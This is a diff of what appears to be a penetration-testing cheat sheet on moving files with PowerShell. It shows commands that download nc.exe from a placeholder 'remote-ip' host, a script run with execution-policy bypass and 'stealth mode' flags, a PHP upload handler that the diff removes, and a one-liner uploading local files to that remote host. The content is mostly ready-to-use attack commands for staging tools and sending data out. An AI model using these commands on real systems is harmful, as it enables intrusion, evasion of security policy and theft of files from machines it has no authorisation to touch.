@@ -62,7 +62,7 @@ Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe'
 Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe' -proxy "http://proxy.contoso.com:8080
 ```
 
-## Downlaod a file using powershell script with stealth mode
+## Upload and Downlaod a file using powershell script with stealth mode
 
 * Bypass security policy and default profile
 * -ExecutionPolicy Bypass
@@ -73,7 +73,7 @@ Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe' -proxy "http:
 * -NoLogo
 
 ```powershell
-type .\wget.ps1
+cat .\wget.ps1
 $webclient = New-Object System.Net.WebClient
 $url = "http://remote-ip/nc.exe"
 $dst = "nc.exe"
@@ -82,23 +82,9 @@ $webclient.DownloadFile($url,$dst)
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File .\wget.ps1
 ```
 
-## Upload File with powershell
 
-* '$' must be escaped in bash scripts
-* \$
 
-```bash
-cat psupload.php
-<?php 
-$uploaddir = '/var/www/html/uploads/';
-$uploadfile = $uploaddir . $_FILES['file']['name'];
-if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
-    echo "Upload done.";
-else
-    echo "Upload error!";
-?>
-```
 
 ```powershell
-powershell $response=(New-Object Net.WebClient).UploadFile('http://remote-ip/psupload.php', '.\Upload.txt'); [Text.Encoding]::UTF8.GetString($response)
+powershell $response=(New-Object Net.WebClient).UploadFile('http://remote-ip/ps-upload.php', '.\Upload.txt'); [Text.Encoding]::UTF8.GetString($response)
 ```
